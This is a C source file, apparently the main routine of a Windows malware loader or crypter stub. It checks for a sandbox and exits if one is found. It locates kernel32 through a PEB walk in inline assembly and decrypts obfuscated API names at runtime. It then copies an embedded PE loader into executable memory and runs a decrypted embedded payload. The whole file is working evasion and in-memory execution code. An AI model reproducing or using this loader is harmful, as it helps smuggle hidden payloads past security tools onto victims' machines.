#include"head.h"
#include"PELoader.h"
#include"decrypt.h"
#include"checkSandBox.h"
//#include"xCodeLoader.h"
//#include"data-test.h"
//#include"helloWorld.h"
//#include"wdm.h"
#include"data_encrypt.h"


#include"basicFuncName_encrypt.h"

#pragma warning( once : 4309 4305 )




DWORD SourceAddress = 0;
DWORD DestinationAddress = 0;
DWORD CopySize = 0;

LPVOID PELoaderAddr = 0;


LPVOID MyGetKenel32ProcAddr(DWORD ProcHash);

DWORD i = 0;


int main(int argc,char** argv) {

	if (checkSandBox() == true) return 5;

	DWORD FileSize = 0;
	//GetProAddress
	typedef FARPROC(WINAPI* PGETPROCADDRESS)(HMODULE hModule, LPCSTR lpProcName);
	//LoadLibrary
	typedef HMODULE(WINAPI* PLOADLIBRARY)(LPCSTR lpLibFileName);
	//VirtualAlloc
	typedef LPVOID(WINAPI* PVIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	//VirtualProtect
	typedef BOOL(WINAPI* PVIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
	//GetLastError
	typedef	DWORD(WINAPI* PGETLASTERROR)(VOID);
	//UnmapViewOfFile
	typedef	BOOL(WINAPI* PUNMAPVIEWOFFILE)(LPCVOID lpBaseAddress);

	PGETPROCADDRESS pGetProcAddress = NULL;
	PLOADLIBRARY pLoadLibrary = NULL;
	PVIRTUALALLOC pVirtualAlloc = NULL;
	PVIRTUALPROTECT pVirtualProtect = NULL;
	PGETLASTERROR pGetLastError = NULL;
	unsigned long pKernel32Module = 0;

	DWORD SourceAddress = 0;
	DWORD DestinationAddress = 0;
	DWORD CopySize = 0;
	
	unsigned long HashKernel32 = 0x330;
	// Get the address of the Kernel32 module
	_asm {
		pushad;
		mov eax, fs: [0x30] ;
		mov eax, [eax + 0xc];
		mov ebx, eax;
		add ebx, 0xc;
		mov eax, [eax + 0xc];
	Addr1:
		mov edi, [eax + 0x30];
		mov ecx, 12 * 2;
		xor esi, esi;

	NextKernel32:
		xor ebx, ebx;
		add bl, byte ptr[edi + ecx - 1];
		add esi, ebx;
		loop NextKernel32;
		cmp esi, HashKernel32;
		je End;


		mov eax, [eax];
		cmp eax, ebx;
		jne Addr1;
	End:
		mov eax, [eax + 0x18];
		mov pKernel32Module, eax;
		nop;
		popad;
	}

	pGetProcAddress = (PGETPROCADDRESS)GetProcAddress;
	

	// Get the address of the LoadLibraryA, VirtualAlloc, VirtualProtect functions
	decrypt(strLoadLibraryA, szLoadLibraryA, pFuncKey, SizeOfFuncKey,&szLoadLibraryA);
	pLoadLibrary = (PLOADLIBRARY)pGetProcAddress((HMODULE)pKernel32Module, (char*)strLoadLibraryA);

	decrypt(strVirtualAlloc, szVirtualAlloc, pFuncKey, SizeOfFuncKey,&szVirtualAlloc);
	pVirtualAlloc = (PVIRTUALALLOC)pGetProcAddress((HMODULE)pKernel32Module, (char*)strVirtualAlloc);


	decrypt(strVirtualProtect, szVirtualProtect, pFuncKey, SizeOfFuncKey,&szVirtualProtect);
	pVirtualProtect = (PVIRTUALPROTECT)pGetProcAddress((HMODULE)pKernel32Module, (char*)strVirtualProtect);




	
	// Copy the PELoader code to a new memory region with PAGE_EXECUTE_READWRITE protection
	DWORD CodeSize = SizeOfPELoader;
	LPVOID pCodeBuffer = pVirtualAlloc(NULL, CodeSize + 1, MEM_COMMIT, PAGE_READWRITE);
	SourceAddress = (DWORD)pPELoader;
	DestinationAddress = (DWORD)pCodeBuffer;
	CopySize = CodeSize;
	_asm {
		mov esi, SourceAddress;
		mov edi, DestinationAddress;
		mov ecx, CopySize;
		rep movsb;
	}

	// Change the protection of the memory region to PAGE_EXECUTE_READ
	pCodeBuffer = pCodeBuffer;
	CodeSize = SizeOfPELoader;
	DWORD lpflOldProtect = 0;
	pVirtualProtect(pCodeBuffer, SizeOfPELoader, PAGE_EXECUTE_READ, &lpflOldProtect);
	

	LPVOID pData = decrypt((PBYTE)hexData, hSize, (PBYTE)pKey, kSize, &hSize);

	


	PELoaderAddr = pCodeBuffer;


	// Call the PELoader function
	char* exePath = NULL;
	exePath = argv[0];	
	DWORD baseFlag = 1;
	_asm {
		push exePath;
		push baseFlag;
		push pData;
		call PELoaderAddr;
		add  esp, 12;
	}

	

	return 0;
}
